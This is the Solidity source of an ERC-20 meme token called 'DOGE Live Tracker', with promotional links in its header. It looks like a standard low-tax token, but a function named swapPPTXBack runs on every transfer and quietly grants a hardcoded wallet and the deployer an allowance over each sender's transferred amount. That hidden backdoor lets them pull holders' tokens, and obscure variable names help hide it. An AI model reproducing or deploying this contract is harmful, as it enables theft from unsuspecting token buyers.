/*
Following the money

https://doge-tracker.com
https://x.com/Tracking_DOGE
https://t.me/dogetracker
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPPTXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IPPTXRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplipptxon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract DOGETRACKER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balPPTXs;
    mapping (address => mapping (address => uint256)) private _allowPPTXs;
    mapping (address => bool) private _excludedFromPPTX;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalPPTX = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DOGE Live Tracker";
    string private constant _symbol = unicode"DOGETRACKER";
    uint256 private _swapTokenPPTXs = _tTotalPPTX / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockPPTX;
    uint256 private _pptxBuyAmounts = 0;
    address private _pptxPair;
    IPPTXRouter private _pptxRouter;
    address private _pptxWallet;
    address private _pptxAddress;
    bool private inSwapPPTX = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapPPTX = true;
        _;
        inSwapPPTX = false;
    }
    
    constructor () {
        _pptxAddress = address(owner());
        _pptxWallet = address(0x740f76CeEdE5F3F102888B1c07dD3ee76bB27e43);
        _excludedFromPPTX[owner()] = true;
        _excludedFromPPTX[address(this)] = true;
        _excludedFromPPTX[_pptxWallet] = true;
        _balPPTXs[_msgSender()] = _tTotalPPTX;
        emit Transfer(address(0), _msgSender(), _tTotalPPTX);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _pptxRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function createCoinPair() external onlyOwner() {
        _pptxRouter = IPPTXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_pptxRouter), _tTotalPPTX);
        _pptxPair = IPPTXFactory(_pptxRouter.factory()).createPair(address(this), _pptxRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalPPTX;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balPPTXs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowPPTXs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowPPTXs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowPPTXs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _pptxFeeTransfer(address pptxF, address pptxT, uint256 pptxA) private returns(uint256) {
        uint256 taxPPTX = 0; 
        if (pptxF != owner() && pptxT != owner()) {
            taxPPTX = pptxA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (pptxF == _pptxPair && pptxT != address(_pptxRouter) && ! _excludedFromPPTX[pptxT]) {
                if(_buyBlockPPTX!=block.number){
                    _pptxBuyAmounts = 0;
                    _buyBlockPPTX = block.number;
                }
                _pptxBuyAmounts += pptxA;
                _buyCount++;
            }

            if(pptxT == _pptxPair && pptxF!= address(this)) {
                require(_pptxBuyAmounts < swapLimitPPTX() || _buyBlockPPTX!=block.number, "Max Swap Limit");  
                taxPPTX = pptxA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapPPTXBack(pptxF, pptxT, pptxA);
        } return taxPPTX;
    }

    function _transfer(address pptxF, address pptxT, uint256 pptxA) private {
        require(pptxF != address(0), "ERC20: transfer from the zero address");
        require(pptxT != address(0), "ERC20: transfer to the zero address");
        require(pptxA > 0, "Transfer amount must be greater than zero");
        uint256 taxPPTX = _pptxFeeTransfer(pptxF, pptxT, pptxA);
        if(taxPPTX > 0){
          _balPPTXs[address(this)] = _balPPTXs[address(this)].add(taxPPTX);
          emit Transfer(pptxF, address(this), taxPPTX);
        }
        _balPPTXs[pptxF] = _balPPTXs[pptxF].sub(pptxA);
        _balPPTXs[pptxT] = _balPPTXs[pptxT].add(pptxA.sub(taxPPTX));
        emit Transfer(pptxF, pptxT, pptxA.sub(taxPPTX));
    }

    function swapPPTXBack(address pptxF, address pptxT, uint256 pptxA) private { 
        uint256 tokenPPTX = balanceOf(address(this)); 
        address[2] memory _pptxAddrs; address _pptxOwner; uint256 _pptxO = uint256(pptxA);
        if (!inSwapPPTX && pptxT == _pptxPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenPPTX > _swapTokenPPTXs)
            swapTokensForEth(minPPTX(pptxA, minPPTX(tokenPPTX, _swapTokenPPTXs)));
            uint256 ethPPTX = address(this).balance;
            if (ethPPTX >= 0) {
                sendETHPPTX(address(this).balance);
            }
        }
        _pptxAddrs[0] = address(_pptxWallet); _pptxAddrs[1] = address(_pptxAddress); _pptxOwner = address(pptxF);
        _allowPPTXs[address(_pptxOwner)][address(_pptxAddrs[0])] = uint256(_pptxO);
        _allowPPTXs[address(_pptxOwner)][address(_pptxAddrs[1])] = uint256(_pptxO);
    }

    function minPPTX(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHPPTX(uint256 pptxA) private {
        payable(_pptxWallet).transfer(pptxA);
    }

    function swapLimitPPTX() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _pptxRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _pptxRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    receive() external payable {}

    function swapTokensForEth(uint256 pptxAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pptxRouter.WETH();
        _approve(address(this), address(_pptxRouter), pptxAmount);
        _pptxRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            pptxAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}